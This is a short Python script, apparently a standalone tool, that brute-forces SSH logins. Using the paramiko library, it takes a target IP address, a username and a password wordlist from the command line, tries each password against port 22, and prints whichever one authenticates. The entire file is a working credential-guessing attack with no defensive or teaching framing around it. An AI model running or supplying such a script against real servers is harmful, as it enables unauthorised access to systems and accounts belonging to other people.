import paramiko
import sys
import os

# params required to connect over ssh

target_ip = sys.argv[1]
username = sys.argv[2]
passwd_list = sys.argv[3] # Path to wordlist

def connect_ssh(passwd, response = 0):
    client = paramiko.SSHClient() # Create a new ssh client object
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(target_ip, port=22, username=username, password=passwd)
    except paramiko.AuthenticationException:
        response = 1
    client.close()
    return response

with open(passwd_list, "r") as f:
    for i in f:
        passwd = i.strip()

        try:
            response = connect_ssh(passwd)
            if response == 0:
                print(f"Password: {passwd}")
                exit(0)
            else:
                print("Password not found")
        except Exception as e:
            print(e)
        pass
